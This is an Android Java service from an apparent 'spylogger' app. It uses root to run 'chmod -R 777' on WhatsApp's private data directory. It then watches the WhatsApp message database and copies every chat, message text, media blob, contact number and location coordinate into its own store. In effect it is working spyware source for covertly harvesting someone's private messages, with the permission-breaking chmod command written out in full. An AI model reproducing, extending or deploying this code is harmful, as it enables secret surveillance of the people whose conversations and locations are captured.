package com.gravatasufoca.spylogger.services;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Binder;
import android.os.FileObserver;
import android.os.IBinder;
import android.util.Log;

import com.gravatasufoca.spylogger.dao.DatabaseHelper;
import com.gravatasufoca.spylogger.dao.whatsapp.DatabaseHelperExternal;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.TipoMensagem;
import com.gravatasufoca.spylogger.model.TipoMidia;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.model.whatsapp.Messages;
import com.gravatasufoca.spylogger.utils.Utils;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.dao.GenericRawResults;
import com.j256.ormlite.field.DataType;
import com.j256.ormlite.stmt.QueryBuilder;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

import java.io.File;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class WhatsAppService extends Service {

    private String pathToWatch;
    private String inFileName;
    private DatabaseHelperExternal external;
    private Dao<Messages, Integer> daoMsgExternal;

    private DatabaseHelper dbHelper;

    private final IBinder mBinder = new LocalBinder();

    public class LocalBinder extends Binder {
        WhatsAppService getService() {
            return WhatsAppService.this;
        }
    }

    public WhatsAppService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return mBinder;
    }

    private void chmod() {

        try {
            CommandCapture command = new CommandCapture(0, "chmod -R 777 "
                    + android.os.Environment.getDataDirectory().toString()
                    + "/data/com.whatsapp", "chmod -R 777 "
                    + getApplicationContext().getPackageManager()
                    .getPackageInfo(getPackageName(), 0).applicationInfo.dataDir);
            RootTools.getShell(true).add(command);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    @Override
    public void onCreate() {

        pathToWatch = android.os.Environment.getDataDirectory().toString()
                + "/data/com.whatsapp/databases/msgstore.db";

        chmod();
        try {
            inFileName = getApplicationContext().getPackageManager()
                    .getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
                    + "/databases/" + DatabaseHelper.DATABASE_NAME;
        } catch (NameNotFoundException e) {
            e.printStackTrace();
        }


    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if((new File(DatabaseHelperExternal.DATABASE_NAME)).exists()) {
            Log.d("WHATSLOG - FLAGS", Integer.toString(flags));
            Utils.context = getApplicationContext();
            updateTopicos();

            if (Utils.whatsObserver == null)
                setObserver();

            Log.d("WHATSLOG - OBSESRVER", Utils.whatsObserver.toString());
        }
        return START_REDELIVER_INTENT;
    }

    private void setObserver() {
        Utils.whatsObserver = new FileObserver(pathToWatch) { // set up a file observer to
            // watch this directory on
            // sd card

            @Override
            public void onEvent(int event, String file) {

                switch (event) {
                    case FileObserver.MODIFY:
                        Log.d("DEBUG", "MODIFY:" + pathToWatch + file);

                        updateTopicos();
                        break;
                    default:
                        // just ignore
                        break;
                }

            }
        };
        Utils.whatsObserver.startWatching(); // START OBSERVING
    }

    private void updateTopicos() {
        external = new DatabaseHelperExternal(getApplicationContext());
        dbHelper = new DatabaseHelper((getApplicationContext()));
        GenericRawResults<String[]> raws;
        List<Topico> topicos = new ArrayList<>();
        Iterator<String[]> iterator;
        try {
            dbHelper.getWritableDatabase();
            daoMsgExternal = external.getMessagesDao();
            daoMsgExternal.executeRaw("attach database '" + inFileName + "' as 'localdb' ");

            raws = daoMsgExternal.queryRaw("select _id,key_remote_jid, subject,sort_timestamp from chat_list where _id!=-1 and key_remote_jid not in( select idReferencia from localdb.topico where tipoMensagem=0 )");
            iterator = raws.iterator();
            int contador = 0;
            while (iterator.hasNext()) {
                String[] resultRaw = iterator.next();
                Topico topico = new Topico.TopicoBuilder()
                        .setIdReferencia(resultRaw[1])
                        .setNome(resultRaw[2])
                        .setGrupo(resultRaw[2] != null && !resultRaw[2].isEmpty())
                        .build(TipoMensagem.WHATSAPP);

                topicos.add(topico);
                contador++;
                if (iterator.hasNext()) {
                    if (contador == 500) {
                        contador = 0;
                        dbHelper.getDao(Topico.class).create(topicos);
                        topicos = new ArrayList<>();
                    }
                } else {
                    dbHelper.getDao(Topico.class).create(topicos);
                }
            }

        updateMsgs(topicos);

        } catch (Exception e) {
          Log.e("spylogger",e.getMessage());
        }finally {
            raws=null;
            topicos=null;
            iterator=null;
        }
    }

    private void updateMsgs(List<Topico> topicos){
        GenericRawResults<Object[]> rawResults;
        List<Mensagem> mensagens = new ArrayList<>();
        Iterator<Object[]> iterator;
        try {

            rawResults = this.daoMsgExternal
                    .queryRaw("select _id,key_remote_jid,key_from_me,data,timestamp,media_wa_type,media_size,remote_resource,received_timestamp, case when raw_data is not null  then 1 else '' end,media_mime_type,raw_data,thumb_image,latitude,longitude from messages where key_remote_jid!='-1' and _id not in( select idReferencia from localdb.mensagem ) "
                            , new DataType[]{DataType.INTEGER,DataType.STRING,DataType.INTEGER,DataType.STRING,DataType.DATE_LONG,DataType.STRING,DataType.STRING,DataType.STRING,DataType.DATE_LONG,DataType.INTEGER,DataType.STRING,DataType.BYTE_ARRAY,DataType.BYTE_ARRAY});

            iterator = rawResults.iterator();
            int contador = 0;

            while (iterator.hasNext()) {
                Object[] resultRaw;
                try {
                    resultRaw = iterator.next();
                } catch (Exception e) {
                    resultRaw = null;
                }
                if (resultRaw == null) {
                    if(!mensagens.isEmpty()){
                        dbHelper.getDao(Mensagem.class).create(mensagens);
                    }
                   updateMsgs(topicos);
                   return;
                }

                Topico tmpTopico = null;
                for (Topico topico : topicos) {
                    if (topico.getIdReferencia().equals(resultRaw[1])) {
                        tmpTopico = topico;
                        break;
                    }
                }
                if(tmpTopico==null){
                    Log.e(this.getClass().getSimpleName(),"TOPICO NAO ENCONTRADO: "+resultRaw[1]);
                    continue;
                }
                Mensagem mensagem = new Mensagem.MensagemBuilder()
                        .setIdReferencia(Integer.toString((Integer) resultRaw[0]))
                        .setRemetente("1".equals(resultRaw[2]))
                        .setTexto((String) resultRaw[3])
                        .setData((Date) resultRaw[4])
                        .setDataRecebida((Date) resultRaw[8])
                        .setTamanhoArquivo(Long.parseLong((String) resultRaw[6]))
                        .setTipoMidia(TipoMidia.getTipoMidia((String) resultRaw[5]))
                        .setMediaMime((String) resultRaw[10])
                        .setContato((String) (resultRaw[7] != null ? resultRaw[7] : resultRaw[1]))
                        .setTopico(tmpTopico)
                        .setTemMedia("1".equals(resultRaw[9]))
                        .setLatitude(resultRaw[13]!=null? Double.parseDouble((String) resultRaw[13]):null )
                        .setLongitude(resultRaw[14]!=null? Double.parseDouble((String) resultRaw[14]):null)
                        .build();
                mensagem.setRaw_data(resultRaw[11]!=null? Utils.encodeBase64((byte[]) resultRaw[11]):null);

                if(!mensagem.getRemetente()) {
                    if (resultRaw[7] != null && !((String)resultRaw[7]).isEmpty()) {
                        if (((String)resultRaw[7]).indexOf("@") != -1) {
                            mensagem.setNumeroContato(((String)resultRaw[7]).substring(0, ((String)resultRaw[7]).indexOf("@")));
                        } else {
                            mensagem.setNumeroContato(((String)resultRaw[7]));
                        }
                    } else {
                        if (((String)resultRaw[1]).indexOf("@") != -1) {
                            mensagem.setNumeroContato(((String)resultRaw[1]).substring(0, ((String)resultRaw[1]).indexOf("@")));
                        } else {
                            mensagem.setNumeroContato(((String)resultRaw[1]));
                        }
                    }
                }else{
                    mensagem.setContato(null);
                    mensagem.setNumeroContato(null);
                }

                if (tmpTopico == null) {
                    QueryBuilder<Topico, Integer> qb = (QueryBuilder<Topico, Integer>) dbHelper.getDao(Topico.class).queryBuilder();
                    qb.where().eq("idReferencia", resultRaw[1]);
                    tmpTopico = dbHelper.getDao(Topico.class).queryForFirst(qb.prepare());
                    mensagem.setTopico(tmpTopico);
                }
                mensagens.add(mensagem);
                contador++;
                try {
                    if (iterator.hasNext()) {
                        if (contador == 10000) {
                            contador = 0;
                            dbHelper.getDao(Mensagem.class).create(mensagens);
                            mensagens = new ArrayList<>();
                        }
                    } else {
                        dbHelper.getDao(Mensagem.class).create(mensagens);
                    }
                }catch (Exception e){
                    dbHelper.getDao(Mensagem.class).create(mensagens);
                    updateMsgs(topicos);
                }
            }
            Log.i(this.getClass().getSimpleName(), "TERMINOU");
        }catch (SQLException e){
            Log.e("spylogger",e.getMessage());
        }finally {
            rawResults=null;
            mensagens = null;
            iterator=null;
        }
    }
}